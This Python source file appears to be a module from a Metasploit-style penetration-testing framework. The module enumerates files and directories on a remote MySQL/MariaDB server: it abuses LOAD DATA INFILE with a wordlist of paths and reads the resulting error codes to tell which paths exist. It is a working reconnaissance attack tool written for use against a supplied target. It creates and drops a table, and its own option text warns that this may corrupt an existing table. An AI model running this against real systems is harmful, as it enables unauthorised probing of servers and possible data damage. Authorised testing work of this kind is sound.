import signal
from core.ModuleObtainer import obtainer
from utilities.Colors import color
from utilities.Messages import print_message
from utilities.Tools import tools
import os
import sys
from mysql.connector import connect, Error

info = {
    'author': 'Luis Eduardo Jacome Valencia',
    'date': '2022/02/26',
    'rank': 'Excellent',
    'path': 'auxiliary/gather/mysql/mysql_remote_enumerator.py',
    'category': 'auxiliary',
    'license': 'GPL-2.0',
    'description': 'Enumerate remote directories with credentials of MySQL/MariaDB. Based on the script of Robin Wood.',
    'references': ['']
}
options = {
    'rhost': ['Yes', 'Set target to attack', ''],
    'rport': ['Yes', 'Set port to connect: i.e :3306', '3306'],
    'wordlist': ['Yes', 'Set a wordlist to check the remote directories', ''],
    'database-name': ['Yes', 'Name of the database to use', 'mysql'],
    'table-name': ['Yes', 'Warning, if the table already exists, its contents will be corrupted', os.urandom(8).hex()],
    'username': ['Yes', 'Username to connect', 'root'],
    'password': ['Yes', 'Password of the user', ''],
}

required = {
    'start_required': 'True',
    'check_required': 'False'
}


class MYSQLFileEnumerator:
    def __init__(self, rhost, rport, file_list, db_name, table_name, username, password=None):
        self.rhost = rhost
        self.rport = rport
        self.file_list = file_list
        self.db_name = db_name
        self.table_name = table_name
        self.username = username
        self.password = password
        self.mysql_handle = None

    def connect(self):
        try:
            self.mysql_handle = connect(
                user=self.username,
                password=self.password,
                host=self.rhost,
                port=self.rport,
                database=self.db_name
            )
        except Error as e:
            print(f"Error connecting to MySQL database: {e}", file=sys.stderr)
            return False
        return True

    def mysql_query_no_handle(self, sql):
        cursor = self.mysql_handle.cursor()
        cursor.execute(sql)
        return cursor

    def run(self):
        if not self.connect():
            return

        try:
            self.mysql_query_no_handle(f"USE {self.db_name}")
        except Error as e:
            print(f"MySQL Error: {e}", file=sys.stderr)
            return

        cursor = self.mysql_query_no_handle(f"SELECT * FROM information_schema.TABLES WHERE TABLE_SCHEMA = '{self.db_name}' AND TABLE_NAME = '{self.table_name}';")
        table_exists = (cursor.fetchone() is not None)

        if not table_exists:
            self.mysql_query_no_handle(f"CREATE TABLE {self.table_name} (brute int);")

        with open(self.file_list, 'r') as file:
            for line in file:
                self.check_dir(line.rstrip())

        if not table_exists:
            self.mysql_query_no_handle(f"DROP TABLE {self.table_name}")

    def check_dir(self, directory):
        try:
            cursor = self.mysql_query_no_handle(f"LOAD DATA INFILE '{directory}' INTO TABLE {self.table_name}")
        except Error as e:
            if e.errno == 2:
                print(color.color("yellow", "[+] directory found: " + directory))
                return
            elif e.errno == 13:
                print(color.color("blue", "[+] file found: " + directory))
                return
            else:
                print(f"MySQL Error: {e}", file=sys.stderr)
                return
        else:
            print(color.color("blue", "[+] file found: " + directory))


def exploit():
    """ main exploit function """
    try:
        print_message.start_execution()

        _rhost = obtainer.options['rhost'][2]
        _rport = obtainer.options['rport'][2]
        _file_list = obtainer.options['wordlist'][2]
        _database_name = obtainer.options['database-name'][2]
        _table_name = obtainer.options['table-name'][2]
        _username = obtainer.options['username'][2]
        _password = obtainer.options['password'][2]

        enumerator = MYSQLFileEnumerator(_rhost, _rport, _file_list, _database_name, _table_name, _username, _password)
        enumerator.run()

    except (AttributeError, TypeError) as e:
        print_message.execution_error("lgray", " You must enter the parameters!")
        return False

    print_message.end_execution()


